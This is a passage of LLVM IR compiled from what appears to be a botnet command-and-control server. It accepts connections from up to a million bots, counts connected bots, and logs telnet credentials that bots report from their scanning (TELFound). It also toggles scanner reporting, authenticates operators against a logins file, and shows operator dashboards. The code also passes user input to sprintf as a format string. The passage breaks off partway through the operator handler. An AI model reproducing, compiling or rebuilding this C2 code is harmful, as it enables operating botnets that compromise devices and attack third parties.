  %135 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %134
  %136 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %135, i32 0, i32 0
  %137 = load i32, i32* %136, align 8
  %138 = icmp eq i32 %132, %137
  br i1 %138, label %139, label %140

139:                                              ; preds = %127
  store i32 1, i32* %12, align 4
  br label %144

140:                                              ; preds = %127
  br label %141

141:                                              ; preds = %140, %126
  %142 = load i32, i32* %11, align 4
  %143 = add nsw i32 %142, 1
  store i32 %143, i32* %11, align 4
  br label %112, !llvm.loop !12

144:                                              ; preds = %139, %112
  %145 = load i32, i32* %12, align 4
  %146 = icmp ne i32 %145, 0
  br i1 %146, label %147, label %157

147:                                              ; preds = %144
  %148 = load i32, i32* %10, align 4
  %149 = call i64 @send(i32 %148, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.5, i64 0, i64 0), i64 13, i32 16384)
  %150 = icmp eq i64 %149, -1
  br i1 %150, label %151, label %154

151:                                              ; preds = %147
  %152 = load i32, i32* %10, align 4
  %153 = call i32 @close(i32 %152)
  br label %88

154:                                              ; preds = %147
  %155 = load i32, i32* %10, align 4
  %156 = call i32 @close(i32 %155)
  br label %88

157:                                              ; preds = %144
  %158 = load i32, i32* %10, align 4
  %159 = call i32 @make_socket_non_blocking(i32 %158)
  store i32 %159, i32* %5, align 4
  %160 = load i32, i32* %5, align 4
  %161 = icmp eq i32 %160, -1
  br i1 %161, label %162, label %165

162:                                              ; preds = %157
  %163 = load i32, i32* %10, align 4
  %164 = call i32 @close(i32 %163)
  br label %183

165:                                              ; preds = %157
  %166 = load i32, i32* %10, align 4
  %167 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %3, i32 0, i32 1
  %168 = bitcast %union.epoll_data* %167 to i32*
  store i32 %166, i32* %168, align 1
  %169 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %3, i32 0, i32 0
  store i32 -2147483647, i32* %169, align 1
  %170 = load volatile i32, i32* @epollFD, align 4
  %171 = load i32, i32* %10, align 4
  %172 = call i32 @epoll_ctl(i32 %170, i32 1, i32 %171, %struct.epoll_event* %3) #9
  store i32 %172, i32* %5, align 4
  %173 = load i32, i32* %5, align 4
  %174 = icmp eq i32 %173, -1
  br i1 %174, label %175, label %178

175:                                              ; preds = %165
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.6, i64 0, i64 0))
  %176 = load i32, i32* %10, align 4
  %177 = call i32 @close(i32 %176)
  br label %183

178:                                              ; preds = %165
  %179 = load i32, i32* %10, align 4
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %180
  %182 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %181, i32 0, i32 1
  store i8 1, i8* %182, align 4
  br label %88

183:                                              ; preds = %175, %162, %102, %101
  br label %292

184:                                              ; preds = %77
  %185 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %186 = load i32, i32* %7, align 4
  %187 = sext i32 %186 to i64
  %188 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %185, i64 %187
  %189 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %188, i32 0, i32 1
  %190 = bitcast %union.epoll_data* %189 to i32*
  %191 = load i32, i32* %190, align 1
  store i32 %191, i32* %13, align 4
  %192 = load i32, i32* %13, align 4
  %193 = sext i32 %192 to i64
  %194 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %193
  store %struct.clientdata_t* %194, %struct.clientdata_t** %14, align 8
  store i32 0, i32* %15, align 4
  %195 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %196 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %195, i32 0, i32 1
  store i8 1, i8* %196, align 4
  br label %197

197:                                              ; preds = %184, %288
  %198 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %198, i8 0, i64 2048, i1 false)
  br label %199

199:                                              ; preds = %263, %262, %255, %247, %231, %225, %197
  %200 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %200, i8 0, i64 2048, i1 false)
  %201 = icmp ne i8* %200, null
  br i1 %201, label %202, label %208

202:                                              ; preds = %199
  %203 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %204 = load i32, i32* %13, align 4
  %205 = call i32 @fdgets(i8* %203, i32 2048, i32 %204)
  %206 = sext i32 %205 to i64
  store i64 %206, i64* %16, align 8
  %207 = icmp sgt i64 %206, 0
  br label %208

208:                                              ; preds = %202, %199
  %209 = phi i1 [ false, %199 ], [ %207, %202 ]
  br i1 %209, label %210, label %266

210:                                              ; preds = %208
  %211 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %212 = call i8* @strstr(i8* %211, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.3, i64 0, i64 0)) #8
  %213 = icmp eq i8* %212, null
  br i1 %213, label %214, label %215

214:                                              ; preds = %210
  store i32 1, i32* %15, align 4
  br label %266

215:                                              ; preds = %210
  %216 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @trim(i8* %216)
  %217 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %218 = call i32 @strcmp(i8* %217, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0)) #8
  %219 = icmp eq i32 %218, 0
  br i1 %219, label %220, label %226

220:                                              ; preds = %215
  %221 = load i32, i32* %13, align 4
  %222 = call i64 @send(i32 %221, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i64 0, i64 0), i64 5, i32 16384)
  %223 = icmp eq i64 %222, -1
  br i1 %223, label %224, label %225

224:                                              ; preds = %220
  store i32 1, i32* %15, align 4
  br label %266

225:                                              ; preds = %220
  br label %199, !llvm.loop !13

226:                                              ; preds = %215
  %227 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %228 = call i8* @strstr(i8* %227, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i64 0, i64 0)) #8
  %229 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %230 = icmp eq i8* %228, %229
  br i1 %230, label %231, label %242

231:                                              ; preds = %226
  %232 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %233 = call i8* @strstr(i8* %232, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i64 0, i64 0)) #8
  %234 = getelementptr inbounds i8, i8* %233, i64 7
  store i8* %234, i8** %18, align 8
  %235 = load %struct._IO_FILE*, %struct._IO_FILE** @telFD, align 8
  %236 = load i8*, i8** %18, align 8
  %237 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %235, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.9, i64 0, i64 0), i8* %236)
  %238 = load %struct._IO_FILE*, %struct._IO_FILE** @telFD, align 8
  %239 = call i32 @fflush(%struct._IO_FILE* %238)
  %240 = load volatile i32, i32* @TELFound, align 4
  %241 = add nsw i32 %240, 1
  store volatile i32 %241, i32* @TELFound, align 4
  br label %199, !llvm.loop !13

242:                                              ; preds = %226
  %243 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %244 = call i8* @strstr(i8* %243, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.10, i64 0, i64 0)) #8
  %245 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %246 = icmp eq i8* %244, %245
  br i1 %246, label %247, label %250

247:                                              ; preds = %242
  %248 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %249 = call i8* @strstr(i8* %248, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.10, i64 0, i64 0)) #8
  store i8* %249, i8** %19, align 8
  store volatile i32 1, i32* @scannerreport, align 4
  br label %199, !llvm.loop !13

250:                                              ; preds = %242
  %251 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %252 = call i8* @strstr(i8* %251, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.11, i64 0, i64 0)) #8
  %253 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %254 = icmp eq i8* %252, %253
  br i1 %254, label %255, label %258

255:                                              ; preds = %250
  %256 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %257 = call i8* @strstr(i8* %256, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.11, i64 0, i64 0)) #8
  store i8* %257, i8** %20, align 8
  store volatile i32 0, i32* @scannerreport, align 4
  br label %199, !llvm.loop !13

258:                                              ; preds = %250
  %259 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %260 = call i32 @strcmp(i8* %259, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i64 0, i64 0)) #8
  %261 = icmp eq i32 %260, 0
  br i1 %261, label %262, label %263

262:                                              ; preds = %258
  br label %199, !llvm.loop !13

263:                                              ; preds = %258
  %264 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %265 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.13, i64 0, i64 0), i8* %264)
  br label %199, !llvm.loop !13

266:                                              ; preds = %224, %214, %208
  %267 = load i64, i64* %16, align 8
  %268 = icmp eq i64 %267, -1
  br i1 %268, label %269, label %275

269:                                              ; preds = %266
  %270 = call i32* @__errno_location() #10
  %271 = load i32, i32* %270, align 4
  %272 = icmp ne i32 %271, 11
  br i1 %272, label %273, label %274

273:                                              ; preds = %269
  store i32 1, i32* %15, align 4
  br label %274

274:                                              ; preds = %273, %269
  br label %289

275:                                              ; preds = %266
  %276 = load i64, i64* %16, align 8
  %277 = icmp eq i64 %276, 0
  br i1 %277, label %278, label %279

278:                                              ; preds = %275
  store i32 1, i32* %15, align 4
  br label %289

279:                                              ; preds = %275
  br label %280

280:                                              ; preds = %279
  %281 = load i32, i32* %15, align 4
  %282 = icmp ne i32 %281, 0
  br i1 %282, label %283, label %288

283:                                              ; preds = %280
  %284 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %285 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %284, i32 0, i32 1
  store i8 0, i8* %285, align 4
  %286 = load i32, i32* %13, align 4
  %287 = call i32 @close(i32 %286)
  br label %288

288:                                              ; preds = %283, %280
  br label %197

289:                                              ; preds = %278, %274
  br label %290

290:                                              ; preds = %289
  br label %291

291:                                              ; preds = %290
  br label %292

292:                                              ; preds = %291, %183, %58
  %293 = load i32, i32* %7, align 4
  %294 = add nsw i32 %293, 1
  store i32 %294, i32* %7, align 4
  br label %27, !llvm.loop !14

295:                                              ; preds = %27
  br label %23
}

; Function Attrs: nounwind
declare noalias align 16 i8* @calloc(i64, i64) #3

declare i32 @epoll_wait(i32, %struct.epoll_event*, i32, i32) #1

declare i32 @close(i32) #1

declare i32 @accept(i32, %struct.sockaddr*, i32*) #1

; Function Attrs: nounwind readnone willreturn
declare i32* @__errno_location() #5

declare void @perror(i8*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @make_socket_non_blocking(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %6 = load i32, i32* %3, align 4
  %7 = call i32 (i32, i32, ...) @fcntl(i32 %6, i32 3, i32 0)
  store i32 %7, i32* %4, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp eq i32 %8, -1
  br i1 %9, label %10, label %11

10:                                               ; preds = %1
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.80, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %21

11:                                               ; preds = %1
  %12 = load i32, i32* %4, align 4
  %13 = or i32 %12, 2048
  store i32 %13, i32* %4, align 4
  %14 = load i32, i32* %3, align 4
  %15 = load i32, i32* %4, align 4
  %16 = call i32 (i32, i32, ...) @fcntl(i32 %14, i32 4, i32 %15)
  store i32 %16, i32* %5, align 4
  %17 = load i32, i32* %5, align 4
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %19, label %20

19:                                               ; preds = %11
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.80, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %21

20:                                               ; preds = %11
  store i32 0, i32* %2, align 4
  br label %21

21:                                               ; preds = %20, %19, %10
  %22 = load i32, i32* %2, align 4
  ret i32 %22
}

; Function Attrs: nounwind
declare i32 @epoll_ctl(i32, i32, i32, %struct.epoll_event*) #3

; Function Attrs: nounwind readonly willreturn
declare i8* @strstr(i8*, i8*) #2

declare i32 @fprintf(%struct._IO_FILE*, i8*, ...) #1

declare i32 @fflush(%struct._IO_FILE*) #1

declare i32 @printf(i8*, ...) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @BotsConnected() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

3:                                                ; preds = %17, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  br i1 %5, label %6, label %20

6:                                                ; preds = %3
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %8
  %10 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %9, i32 0, i32 1
  %11 = load i8, i8* %10, align 4
  %12 = icmp ne i8 %11, 0
  br i1 %12, label %14, label %13

13:                                               ; preds = %6
  br label %17

14:                                               ; preds = %6
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %2, align 4
  br label %17

17:                                               ; preds = %14, %13
  %18 = load i32, i32* %1, align 4
  %19 = add nsw i32 %18, 1
  store i32 %19, i32* %1, align 4
  br label %3, !llvm.loop !15

20:                                               ; preds = %3
  %21 = load i32, i32* %2, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @Find_Login(i8* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct._IO_FILE*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [512 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 0, i32* %5, align 4
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %9 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.14, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.15, i64 0, i64 0))
  store %struct._IO_FILE* %9, %struct._IO_FILE** %4, align 8
  %10 = icmp eq %struct._IO_FILE* %9, null
  br i1 %10, label %11, label %12

11:                                               ; preds = %1
  store i32 -1, i32* %2, align 4
  br label %42

12:                                               ; preds = %1
  br label %13

13:                                               ; preds = %27, %12
  %14 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %15 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %16 = call i8* @fgets(i8* %14, i32 512, %struct._IO_FILE* %15)
  %17 = icmp ne i8* %16, null
  br i1 %17, label %18, label %30

18:                                               ; preds = %13
  %19 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %20 = load i8*, i8** %3, align 8
  %21 = call i8* @strstr(i8* %19, i8* %20) #8
  %22 = icmp ne i8* %21, null
  br i1 %22, label %23, label %27

23:                                               ; preds = %18
  %24 = load i32, i32* %6, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %6, align 4
  %26 = load i32, i32* %5, align 4
  store i32 %26, i32* %7, align 4
  br label %27

27:                                               ; preds = %23, %18
  %28 = load i32, i32* %5, align 4
  %29 = add nsw i32 %28, 1
  store i32 %29, i32* %5, align 4
  br label %13, !llvm.loop !16

30:                                               ; preds = %13
  %31 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %32 = icmp ne %struct._IO_FILE* %31, null
  br i1 %32, label %33, label %36

33:                                               ; preds = %30
  %34 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %35 = call i32 @fclose(%struct._IO_FILE* %34)
  br label %36

36:                                               ; preds = %33, %30
  %37 = load i32, i32* %6, align 4
  %38 = icmp eq i32 %37, 0
  br i1 %38, label %39, label %40

39:                                               ; preds = %36
  store i32 0, i32* %2, align 4
  br label %42

40:                                               ; preds = %36
  %41 = load i32, i32* %7, align 4
  store i32 %41, i32* %2, align 4
  br label %42

42:                                               ; preds = %40, %39, %11
  %43 = load i32, i32* %2, align 4
  ret i32 %43
}

declare noalias %struct._IO_FILE* @fopen(i8*, i8*) #1

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #1

declare i32 @fclose(%struct._IO_FILE*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @TitleWriter(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [2048 x i8], align 16
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %3, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = ptrtoint i8* %6 to i32
  store i32 %7, i32* %4, align 4
  br label %8

8:                                                ; preds = %1, %26
  %9 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %9, i8 0, i64 2048, i1 false)
  %10 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  %11 = call i32 @BotsConnected()
  %12 = load i32, i32* %3, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %13
  %15 = getelementptr inbounds %struct.login_info, %struct.login_info* %14, i32 0, i32 0
  %16 = getelementptr inbounds [100 x i8], [100 x i8]* %15, i64 0, i64 0
  %17 = load volatile i32, i32* @OperatorsConnected, align 4
  %18 = call i32 (i8*, i8*, ...) @sprintf(i8* %10, i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.16, i64 0, i64 0), i32 27, i32 %11, i8* %16, i32 %17, i32 7) #9
  %19 = load i32, i32* %4, align 4
  %20 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  %21 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  %22 = call i64 @strlen(i8* %21) #8
  %23 = call i64 @send(i32 %19, i8* %20, i64 %22, i32 16384)
  %24 = icmp eq i64 %23, -1
  br i1 %24, label %25, label %26

25:                                               ; preds = %8
  ret i8* null

26:                                               ; preds = %8
  %27 = call i32 @sleep(i32 2)
  br label %8
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #3

declare i32 @sleep(i32) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @BotWorker(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i64, align 8
  %7 = alloca [2048 x i8], align 16
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca [2048 x i8], align 16
  %11 = alloca [2048 x i8], align 16
  %12 = alloca [2048 x i8], align 16
  %13 = alloca %struct._IO_FILE*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [2048 x i8], align 16
  %18 = alloca [5000 x i8], align 16
  %19 = alloca i8*, align 8
  %20 = alloca [5000 x i8], align 16
  %21 = alloca [500 x i8], align 16
  %22 = alloca [500 x i8], align 16
  %23 = alloca [500 x i8], align 16
  %24 = alloca [500 x i8], align 16
  %25 = alloca [500 x i8], align 16
  %26 = alloca [5000 x i8], align 16
  %27 = alloca [5000 x i8], align 16
  %28 = alloca [5000 x i8], align 16
  %29 = alloca [5000 x i8], align 16
  %30 = alloca [5000 x i8], align 16
  %31 = alloca [5000 x i8], align 16
  %32 = alloca [5000 x i8], align 16
  %33 = alloca [5000 x i8], align 16
  %34 = alloca [5000 x i8], align 16
  %35 = alloca [5000 x i8], align 16
  %36 = alloca [5000 x i8], align 16
  %37 = alloca [5000 x i8], align 16
  %38 = alloca [2048 x i8], align 16
  %39 = alloca [2048 x i8], align 16
  %40 = alloca [2048 x i8], align 16
  %41 = alloca [5000 x i8], align 16
  %42 = alloca [800 x i8], align 16
  %43 = alloca [800 x i8], align 16
  %44 = alloca [800 x i8], align 16
  %45 = alloca [800 x i8], align 16
  %46 = alloca [800 x i8], align 16
  %47 = alloca [800 x i8], align 16
  %48 = alloca [800 x i8], align 16
  %49 = alloca [800 x i8], align 16
  %50 = alloca [5000 x i8], align 16
  %51 = alloca [800 x i8], align 16
  %52 = alloca [800 x i8], align 16
  %53 = alloca [800 x i8], align 16
  %54 = alloca [800 x i8], align 16
  %55 = alloca [800 x i8], align 16
  %56 = alloca [800 x i8], align 16
  %57 = alloca [5000 x i8], align 16
  %58 = alloca [2048 x i8], align 16
  %59 = alloca [2048 x i8], align 16
  %60 = alloca [2048 x i8], align 16
  %61 = alloca [5000 x i8], align 16
  %62 = alloca [2048 x i8], align 16
  %63 = alloca [5000 x i8], align 16
  %64 = alloca [2048 x i8], align 16
  %65 = alloca [5000 x i8], align 16
  %66 = alloca %struct._IO_FILE*, align 8
  %67 = alloca i64, align 8
  %68 = alloca %struct.tm*, align 8
  %69 = alloca [50 x i8], align 16
  %70 = alloca [50 x i8], align 16
  store i8* %0, i8** %3, align 8
  %71 = load i8*, i8** %3, align 8
  %72 = ptrtoint i8* %71 to i32
  store i32 %72, i32* %4, align 4
  %73 = load volatile i32, i32* @OperatorsConnected, align 4
  %74 = add nsw i32 %73, 1
  store volatile i32 %74, i32* @OperatorsConnected, align 4
  %75 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %75, i8 0, i64 2048, i1 false)
  %76 = getelementptr inbounds [2048 x i8], [2048 x i8]* %10, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %76, i8 0, i64 2048, i1 false)
  %77 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %77, i8 0, i64 2048, i1 false)
  %78 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %78, i8 0, i64 2048, i1 false)
  store i32 0, i32* %14, align 4
  %79 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.14, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.15, i64 0, i64 0))
  store %struct._IO_FILE* %79, %struct._IO_FILE** %13, align 8
  br label %80

80:                                               ; preds = %85, %1
  %81 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %82 = call i32 @feof(%struct._IO_FILE* %81) #9
  %83 = icmp ne i32 %82, 0
  %84 = xor i1 %83, true
  br i1 %84, label %85, label %90

85:                                               ; preds = %80
  %86 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %87 = call i32 @fgetc(%struct._IO_FILE* %86)
  store i32 %87, i32* %15, align 4
  %88 = load i32, i32* %14, align 4
  %89 = add nsw i32 %88, 1
  store i32 %89, i32* %14, align 4
  br label %80, !llvm.loop !17

90:                                               ; preds = %80
  store i32 0, i32* %16, align 4
  %91 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  call void @rewind(%struct._IO_FILE* %91)
  br label %92

92:                                               ; preds = %97, %90
  %93 = load i32, i32* %16, align 4
  %94 = load i32, i32* %14, align 4
  %95 = sub nsw i32 %94, 1
  %96 = icmp ne i32 %93, %95
  br i1 %96, label %97, label %112

97:                                               ; preds = %92
  %98 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %99 = load i32, i32* %16, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %100
  %102 = getelementptr inbounds %struct.login_info, %struct.login_info* %101, i32 0, i32 0
  %103 = getelementptr inbounds [100 x i8], [100 x i8]* %102, i64 0, i64 0
  %104 = load i32, i32* %16, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %105
  %107 = getelementptr inbounds %struct.login_info, %struct.login_info* %106, i32 0, i32 1
  %108 = getelementptr inbounds [100 x i8], [100 x i8]* %107, i64 0, i64 0
  %109 = call i32 (%struct._IO_FILE*, i8*, ...) @__isoc99_fscanf(%struct._IO_FILE* %98, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.17, i64 0, i64 0), i8* %103, i8* %108)
  %110 = load i32, i32* %16, align 4
  %111 = add nsw i32 %110, 1
  store i32 %111, i32* %16, align 4
  br label %92, !llvm.loop !18

112:                                              ; preds = %92
  %113 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %113, i8 0, i64 2048, i1 false)
  %114 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %115 = call i32 (i8*, i8*, ...) @sprintf(i8* %114, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.18, i64 0, i64 0)) #9
  %116 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i64 0, i64 0
  %117 = call i32 (i8*, i8*, ...) @sprintf(i8* %116, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.19, i64 0, i64 0)) #9
  %118 = load i32, i32* %4, align 4
  %119 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i64 0, i64 0
  %120 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i64 0, i64 0
  %121 = call i64 @strlen(i8* %120) #8
  %122 = call i64 @send(i32 %118, i8* %119, i64 %121, i32 16384)
  %123 = icmp eq i64 %122, -1
  br i1 %123, label %124, label %125

124:                                              ; preds = %112
  br label %959

125:                                              ; preds = %112
  %126 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %127 = load i32, i32* %4, align 4
  %128 = call i32 @fdgets(i8* %126, i32 2048, i32 %127)
  %129 = icmp slt i32 %128, 1
  br i1 %129, label %130, label %131

130:                                              ; preds = %125
  br label %959

131:                                              ; preds = %125
  %132 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @trim(i8* %132)
  %133 = load i32, i32* %5, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %134
  %136 = getelementptr inbounds %struct.login_info, %struct.login_info* %135, i32 0, i32 0
  %137 = getelementptr inbounds [100 x i8], [100 x i8]* %136, i64 0, i64 0
  %138 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %139 = call i32 (i8*, i8*, ...) @sprintf(i8* %137, i8* %138) #9
  %140 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  store i8* %140, i8** %19, align 8
  %141 = load i8*, i8** %19, align 8
  %142 = call i32 @Find_Login(i8* %141)
  store i32 %142, i32* %5, align 4
  %143 = load i8*, i8** %19, align 8
  %144 = load i32, i32* %5, align 4
  %145 = sext i32 %144 to i64
  %146 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %145
  %147 = getelementptr inbounds %struct.login_info, %struct.login_info* %146, i32 0, i32 0
  %148 = getelementptr inbounds [100 x i8], [100 x i8]* %147, i64 0, i64 0
  %149 = call i32 @strcmp(i8* %143, i8* %148) #8
  %150 = icmp eq i32 %149, 0
  br i1 %150, label %151, label %321

151:                                              ; preds = %131
  %152 = load i32, i32* %4, align 4
  %153 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %154 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %155 = call i64 @strlen(i8* %154) #8
  %156 = call i64 @send(i32 %152, i8* %153, i64 %155, i32 16384)
  %157 = icmp eq i64 %156, -1
  br i1 %157, label %158, label %159

158:                                              ; preds = %151
  br label %959

159:                                              ; preds = %151
  %160 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i64 0, i64 0
  %161 = load i32, i32* %5, align 4
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %162
  %164 = getelementptr inbounds %struct.login_info, %struct.login_info* %163, i32 0, i32 0
  %165 = getelementptr inbounds [100 x i8], [100 x i8]* %164, i64 0, i64 0
